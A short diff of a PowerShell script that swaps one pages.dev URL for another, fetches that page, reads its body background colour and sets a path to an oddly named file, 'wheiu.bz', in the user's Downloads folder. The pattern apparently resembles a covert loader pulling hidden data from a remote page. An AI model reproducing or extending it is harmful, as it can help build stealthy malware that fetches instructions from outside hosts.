@@ -3,7 +3,7 @@ $urls = @(
 )
 
 $filePath = Join-Path -Path $env:USERPROFILE -ChildPath "Downloads\wheiu.bz"
-$url = "https://e32rj39o4.pages.dev"
+$url = "https://backgroundcolor.pages.dev"
 $response = Invoke-WebRequest -Uri $url
 $backgroundColor = $response.ParsedHtml.getElementsByTagName("body").Style.backgroundColor
 
